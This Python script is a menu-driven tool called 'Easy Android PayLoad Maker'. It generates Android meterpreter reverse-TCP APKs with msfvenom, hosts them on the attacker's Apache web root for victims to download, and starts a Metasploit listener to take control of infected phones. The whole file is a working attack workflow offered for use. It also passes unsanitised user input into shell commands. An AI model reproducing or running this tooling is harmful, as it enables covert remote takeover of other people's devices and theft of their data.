import os
import sys
import json
import subprocess
import threading
import itertools
import time
from colorama import init, Fore

# Inizializza colorama
init(autoreset=True)

CONFIG_FILE = "settings.json"
VERSION = "2.0"

def print_banner():
    print(Fore.CYAN + f"""
░▒▓████████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓██████████████▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
░▒▓██████▓▒░ ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
                            Easy Android PayLoad Maker - Version {VERSION}
                                 Author: ShadowByte
""")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def is_root():
    return os.geteuid() == 0

def load_settings():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE) as f:
            return json.load(f)
    return {"default_ip": "", "default_port": "", "output_dir": "."}

def save_settings(settings):
    with open(CONFIG_FILE, "w") as f:
        json.dump(settings, f)

def configure_settings():
    clear_screen()
    print_banner()
    settings = load_settings()
    ip = input(Fore.YELLOW + f"Default IP [{settings.get('default_ip','')}]: ") or settings.get('default_ip', '')
    port = input(Fore.YELLOW + f"Default Port [{settings.get('default_port','')}]: ") or settings.get('default_port', '')
    out = input(Fore.YELLOW + f"Output directory [{settings.get('output_dir','.')}] : ") or settings.get('output_dir', '.')
    settings.update({"default_ip": ip, "default_port": port, "output_dir": out})
    save_settings(settings)
    print(Fore.GREEN + "Settings saved!")
    input(Fore.YELLOW + "\nPress Enter to continue...")

def spinner(message, stop_event):
    for c in itertools.cycle('|/-\\'):
        if stop_event.is_set():
            break
        sys.stdout.write('\r' + Fore.GREEN + message + ' ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r')

def run_with_spinner(command, message):
    stop_event = threading.Event()
    t = threading.Thread(target=spinner, args=(message, stop_event))
    t.start()
    try:
        subprocess.run(command, shell=True, check=True)
    finally:
        stop_event.set()
        t.join()

def create_apk():
    clear_screen()
    print_banner()
    print(Fore.GREEN + "Creating the APK file...")
    settings = load_settings()
    apk_name = input(Fore.YELLOW + "Enter the name you want to give to the APK: ")
    ip = input(Fore.YELLOW + f"Enter the IP [{settings.get('default_ip','')}]: ") or settings.get('default_ip', '')
    port_input = input(Fore.YELLOW + f"Enter the port [{settings.get('default_port','')}]: ") or settings.get('default_port', '')
    port = int(port_input)
    out_dir = settings.get('output_dir', '.')
    path = os.path.join(out_dir, f"{apk_name}.apk")
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {path}"
    try:
        run_with_spinner(command, "Generating payload")
        print(Fore.GREEN + f"APK file {apk_name}.apk created successfully in {out_dir}!")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error creating APK: {e}")

def move_apk():
    clear_screen()
    print_banner()
    print(Fore.GREEN + "Moving the APK file...")
    settings = load_settings()
    apk_name = input(Fore.YELLOW + "Enter the name of the APK file: ")
    out_dir = settings.get('output_dir', '.')
    path = os.path.join(out_dir, f"{apk_name}.apk")
    try:
        run_with_spinner(f"mv {path} /var/www/html/", "Moving APK")
        print(Fore.GREEN + f"APK file {apk_name}.apk moved successfully to /var/www/html/")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error moving APK: {e}")

def manage_apache_service():
    clear_screen()
    print_banner()
    print(Fore.GREEN + "Managing Apache2 service...")
    action = input(Fore.YELLOW + "Enter 'start' to start or 'stop' to stop Apache2 service: ")
    try:
        if action.lower() == 'start':
            subprocess.run("service apache2 start", shell=True, check=True)
            print(Fore.GREEN + "Apache2 service started successfully!")
        elif action.lower() == 'stop':
            subprocess.run("service apache2 stop", shell=True, check=True)
            print(Fore.GREEN + "Apache2 service stopped successfully!")
        else:
            print(Fore.RED + "Invalid action! Please enter 'start' or 'stop'.")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error managing Apache2 service: {e}")

def list_payloads():
    clear_screen()
    print_banner()
    settings = load_settings()
    out_dir = settings.get('output_dir', '.')
    files = [f for f in os.listdir(out_dir) if f.endswith('.apk')]
    if not files:
        print(Fore.YELLOW + "No APK payloads found.")
    else:
        print(Fore.GREEN + "Generated APK files:\n")
        for f in files:
            print(" - " + f)
    input(Fore.YELLOW + "\nPress Enter to continue...")

def delete_payload():
    clear_screen()
    print_banner()
    settings = load_settings()
    out_dir = settings.get('output_dir', '.')
    apk_name = input(Fore.YELLOW + "Enter the name of the APK to delete: ")
    path = os.path.join(out_dir, apk_name if apk_name.endswith('.apk') else apk_name + '.apk')
    if os.path.exists(path):
        os.remove(path)
        print(Fore.GREEN + f"{os.path.basename(path)} removed.")
    else:
        print(Fore.RED + "APK file not found.")
    input(Fore.YELLOW + "\nPress Enter to continue...")

def start_listener():
    clear_screen()
    print_banner()
    settings = load_settings()
    ip = input(Fore.YELLOW + f"LHOST [{settings.get('default_ip','')}]: ") or settings.get('default_ip', '')
    port = input(Fore.YELLOW + f"LPORT [{settings.get('default_port','')}]: ") or settings.get('default_port', '')
    command = (
        f"msfconsole -q -x \"use multi/handler; set payload android/meterpreter/reverse_tcp; "
        f"set LHOST {ip}; set LPORT {port}; exploit\""
    )
    subprocess.run(command, shell=True)

def main():
    clear_screen()
    print_banner()
    print(Fore.GREEN + "Welcome to Easy Android PayLoad Maker,")

    # Check if the program is run as root
    if not is_root():
        print(Fore.RED + "Error: This program must be run as root!")
        sys.exit(1)

    while True:
        print("\nMenu:")
        print("1. Create Payload APK")
        print("2. Move APK to /var/www/html")
        print("3. Manage Apache2 Service")
        print("4. List Payloads")
        print("5. Delete Payload")
        print("6. Configure Defaults")
        print("7. Start Listener")
        print("8. Exit")

        choice = input(Fore.YELLOW + "\nEnter your choice (1-8): ")

        if choice == '1':
            create_apk()
        elif choice == '2':
            move_apk()
        elif choice == '3':
            manage_apache_service()
        elif choice == '4':
            list_payloads()
        elif choice == '5':
            delete_payload()
        elif choice == '6':
            configure_settings()
        elif choice == '7':
            start_listener()
        elif choice == '8':
            print(Fore.GREEN + "Exiting program. Goodbye!")
            sys.exit(0)
        else:
            print(Fore.RED + "Invalid choice! Please enter a number from 1 to 8.")

if __name__ == "__main__":
    main()
